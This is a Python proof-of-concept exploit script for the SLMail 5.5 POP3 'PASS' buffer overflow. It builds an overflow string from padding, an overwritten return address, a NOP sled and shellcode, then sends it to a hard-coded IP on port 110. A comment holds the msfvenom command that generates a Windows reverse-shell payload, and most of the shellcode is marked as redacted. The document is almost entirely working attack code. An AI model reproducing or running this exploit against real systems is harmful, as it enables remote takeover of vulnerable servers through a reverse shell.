# slmail 5.5 POP3 'PASS' remote buffer overflow, PoC rewrite by size_t

#!/usr/bin/python
import socket
import sys

padding = "A" * 4654
#77CFCA23
eip = "\x23\xca\xcf\x77"
nops = "\x90" * 100
#badchars: \x00\x0D\x0A
#msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f py â€“e x86/shikata_ga_nai -b "\x00\x0A\x0D"
buf =  b""
buf += b"\xbe\x51\x9f\x0e\x1c\xd9\xe9\xd9\x74\x24\xf4\x5a\x31"
#...shellcode redacted..

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.62.5', 110))
s.recv(1024)
s.send('USER size_t \r\n')
s.recv(1024)
s.send('PASS ' + padding + eip + nops + buf +  '\r\n')
s.send('QUIT\r\n')
s.close()
